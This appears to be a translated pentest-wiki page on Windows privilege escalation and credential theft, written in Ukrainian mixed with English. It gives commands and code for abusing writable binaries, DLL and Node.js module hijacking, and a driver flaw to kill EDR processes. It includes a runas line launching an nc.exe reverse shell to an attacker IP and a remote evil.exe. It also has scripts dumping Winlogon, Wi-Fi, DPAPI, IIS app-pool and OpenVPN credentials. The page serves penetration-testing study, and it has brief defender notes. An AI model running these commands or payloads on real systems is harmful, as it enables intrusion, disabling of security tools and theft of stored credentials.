Windows дозволяє користувачам вказувати дії, які слід виконати, якщо служба зазнає збою. Цю функцію можна налаштувати так, щоб вона вказувала на binary. Якщо цей binary можна замінити, може бути можлива privilege escalation. Більше деталей можна знайти в [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Перевірте **permissions of the binaries** (можливо, ви можете перезаписати один із них і підвищити privileges) і **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Дозволи на запис

Перевірте, чи можете ви змінити якийсь config file, щоб прочитати якийсь special file, або чи можете ви змінити якийсь binary, який буде виконуватись акаунтом Administrator (schedtasks).

Один зі способів знайти weak folder/files permissions у system — це зробити:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ автоматично завантажує будь-яку DLL плагіна в його підпапках `plugins`. Якщо є writable portable/copy install, додавання malicious plugin дає automatic code execution всередині `notepad++.exe` на кожному запуску (включно з `DllMain` і plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Перевірте, чи можете ви перезаписати якийсь registry або binary, який буде executed іншим user.**\
**Read** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Шукайте можливі **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо driver надає довільний kernel read/write primitive (це часто трапляється в погано спроєктованих IOCTL handlers), можна підвищити привілеї, безпосередньо вкравши SYSTEM token з kernel memory. Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Для race-condition bugs, де вразливий виклик відкриває шлях Object Manager, контрольований attacker-ом, навмисне уповільнення lookup (за допомогою компонентів максимальної довжини або глибоких ланцюгів каталогів) може розтягнути window з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Примітиви corruption пам’яті registry hive

Сучасні hive vulnerabilities дозволяють groom deterministic layouts, зловживати writable нащадками HKLM/HKU і перетворювати metadata corruption на kernel paged-pool overflows без custom driver. Повний chain дивіться тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion зі шляхів, контрольованих attacker-ом

Деякі drivers приймають шлях registry з userland, перевіряють лише, що це коректний UTF-16 string, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT` у stack scalar, наприклад `int readValue`. Якщо `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не типу, якого очікував developer.

Це створює два корисні primitive:

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path дає driver-у можливість опитувати keys, вибрані attacker-ом, витікати їх існування через return codes/logs і інколи читати values, до яких caller не мав би прямого доступу.
- **Kernel memory corruption**: scalar destination, наприклад `&readValue`, стає type-confused як `REG_QWORD`, `UNICODE_STRING` або sized binary buffer залежно від типу registry value.

Практичні notes з exploitation:

- **Windows 8+ mitigation**: якщо query потрапляє в **untrusted hive** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers падають з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти exploitability, шукайте **attacker-writable keys inside trusted system hives** замість staging values у `HKCU`.
- **Trusted-hive staging**: використовуйте NtObjectManager, щоб перелічити writable descendants `\Registry\Machine`, і повторно запустіть scan з дубльованим **low-integrity** token, щоб знайти keys, доступні з sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8-байтний direct write у 4-байтний `int` пошкоджує суміжні stack-дані та може частково перезаписати nearby callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує керований attacker `REG_DWORD` у stack scalar, а потім повторно використовує той самий buffer для string read, attacker контролює `Length`/`MaximumLength` і частково впливає на `Buffer` pointer, що дає semi-controlled kernel write.
- **`REG_BINARY`**: для large binary data direct mode трактує перший `LONG` у `EntryContext` як signed buffer size. Якщо попередній `REG_DWORD` read залишає **negative** кероване attacker значення в reused scalar, наступний `REG_BINARY` query копіює attacker bytes прямо поверх adjacent stack slots, що часто є найчистішим шляхом до full callback-pointer overwrite.

Strong hunting pattern: **heterogeneous registry reads into the same stack variable without reinitializing it**. Grep for `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, and code paths where the first registry read controls whether a second read happens.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Деякі signed third‑party drivers створюють свій device object із strong SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього flag secure DACL не enforced, коли device відкривається через path з extra component, що дозволяє будь-якому unprivileged user отримати handle, використовуючи namespace path на кшталт:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Після того як user може відкрити device, privileged IOCTLs, exposed драйвером, можна abuse для LPE і tampering. Приклади capabilities, observed in the wild:
- Return full-access handles до arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, включно з Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення device objects, які мають бути обмежені DACL.
- Перевіряйте context виклику для privileged operations. Додавайте PP/PPL checks перед тим, як дозволяти завершення process або повернення handle.
- Обмежуйте IOCTLs (access masks, METHOD_*, input validation) і розгляньте brokered models замість прямого kernel privileges.

Detection ideas for defenders
- Моніторте user-mode opens підозрілих device names (наприклад, \\ .\\amsdk*) і конкретні IOCTL sequences, що вказують на abuse.
- Вмикайте vulnerable driver blocklist від Microsoft (HVCI/WDAC/Smart App Control) і підтримуйте власні allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Це варіант **Windows uncontrolled search path**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний module **відсутній**.

Node розв’язує packages, підіймаючись деревом директорій і перевіряючи папки `node_modules` у кожній батьківській директорії. У Windows це обходження може дійти до кореня диска, тож застосунок, запущений з `C:\Users\Administrator\project\app.js`, може в підсумку перевіряти:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **low-privileged user** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або папку package) і чекати, поки **higher-privileged Node/Electron process** спробує розв’язати відсутню залежність. Payload виконується в security context процесу-жертви, тож це стає **LPE**, якщо ціль запускається від імені administrator, через підвищений scheduled task/service wrapper або через auto-started privileged desktop app.

Це особливо часто трапляється, коли:

- dependency оголошено в `optionalDependencies`
- стороння library обгортає `require("foo")` у `try/catch` і продовжує роботу після failure
- package було видалено з production builds, пропущено під час packaging або не вдалося встановити
- вразливий `require()` знаходиться глибоко в dependency tree, а не в основному code застосунку

### Hunting vulnerable targets

Використовуйте **Procmon**, щоб підтвердити resolution path:

- Filter by `Process Name` = target executable (`node.exe`, EXE Electron app або wrapper process)
- Filter by `Path` `contains` `node_modules`
- Зосередьтеся на `NAME NOT FOUND` і фінальному успішному open у `C:\node_modules`

Корисні code-review patterns у розпакованих `.asar` файлах або application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Експлуатація

1. Визначте **відсутню назву пакета** з Procmon або під час аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо він ще не існує:
```powershell
mkdir C:\node_modules
```
3. Завантажити module з точно очікуваною назвою:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Запустіть уразливу application. Якщо application намагається виконати `require("foo")` і legitimate module відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади missing optional modules, які підпадають під цей pattern, включають `bluebird` і `utf-8-validate`, але **technique** — це reusable частина: знайдіть будь-який **missing bare import**, який privileged Windows Node/Electron process буде resolve.

### Detection and hardening ideas

- Alert, коли user створює `C:\node_modules` або записує туди нові `.js` files/packages.
- Hunt для high-integrity processes, які читають з `C:\node_modules\*`.
- Package всі runtime dependencies у production і audit використання `optionalDependencies`.
- Review third-party code на silent `try { require("...") } catch {}` patterns.
- Disable optional probes, коли library це підтримує (наприклад, деякі `ws` deployments можуть avoid legacy `utf-8-validate` probe з `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте, чи немає в hosts file інших відомих комп’ютерів, прописаних вручну
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте **restricted services** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила Firewall

[**Перевірте цю сторінку для commands, пов’язаних із Firewall**](../basic-cmd-for-pentesters.md#firewall) **(list rules, create rules, turn off, turn off...)**

Більше[ commands для network enumeration тут](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте користувача root, ви можете слухати на будь-якому порту (перший раз, коли ви використовуєте `nc.exe` для прослуховування порту, через GUI буде запитано, чи слід дозволити `nc` брандмауером).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash як root, ви можете спробувати `--default-user root`

Ви можете дослідити файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Windows

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault зберігає облікові дані користувача для серверів, вебсайтів та інших програм, у які **Windows** може **автоматично входити користувачем**. На перший погляд може здатися, що тепер користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб вони автоматично входили через браузери. Але це не так.

Windows Vault зберігає облікові дані, за якими Windows може автоматично входити користувачем, що означає, що будь-яка **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Якщо applications не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для заданого ресурсу. Тож, якщо ваш application хоче скористатися vault, він має якимось чином **communicate with the credential manager and request the credentials for that resource** із vault за замовчуванням.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Тоді ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі викликається віддалений бінарний файл через SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` з наданим набором облікових даних.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, щоб суттєво збільшити entropy.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях, що передбачають системне шифрування, він використовує секрети автентифікації домену системи.

Зашифровані RSA-ключі користувача, за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` представляє [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований поруч із master key, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому перегляд його вмісту через команду `dir` у CMD неможливий, хоча через PowerShell його можна переглянути).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**credentials files**, захищені master password, зазвичай розташовані в:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **mimikatz module** `dpapi::cred` з відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато DPAPI** **masterkeys** з **memory** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** часто використовуються для **scripting** і автоматизації як спосіб зручно зберігати зашифровані credentials. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх може розшифрувати лише той самий користувач на тому самому комп'ютері, на якому їх було створено.

Щоб **decrypt** PS credentials із файлу, що їх містить, ви можете зробити:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-з’єднання

Ви можете знайти їх у `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно запущені команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль **Mimikatz** `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
Ви можете **витягнути багато DPAPI masterkeys** з пам’яті за допомогою модуля Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Люди часто використовують додаток StickyNotes на Windows workstation, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований у `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і його завжди варто шукати та аналізувати.

### AppCmd.exe

**Зверніть увагу, що для відновлення паролів з AppCmd.exe вам потрібно бути Administrator і запускати його на рівні High Integrity.**\
**AppCmd.exe** розташований у директорії `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, тоді можливо, що деякі **credentials** були налаштовані і їх можна **відновити**.

Цей код був витягнутий з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них уразливі до **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys`, тож варто перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, буде збережений SSH key. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю technique тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо service `ssh-agent` не запущено і ви хочете, щоб він автоматично запускався під час завантаження, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, ця technique більше не є valid. Я спробував створити кілька ssh keys, додати їх за допомогою `ssh-add` і увійти через ssh на machine. Registry HKCU\Software\OpenSSH\Agent\Keys не існує, і procmon не виявив використання `dpapi.dll` під час asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Облікові дані Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Шукайте файл під назвою **SiteList.xml**

### Cached GPP Pasword

Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністратора на групі машин через Group Policy Preferences (GPP). Однак цей метод мав серйозні проблеми безпеки. По-перше, Group Policy Objects (GPOs), що зберігалися як XML-файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPPs, зашифровані з використанням AES256 і публічно задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, була розроблена функція для сканування локально кешованих GPP-файлів, що містять поле "cpassword", яке не є порожнім. Після знаходження такого файлу функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.

Шукайте в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ такі файли:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Облікові дані OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Логи
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запросити облікові дані

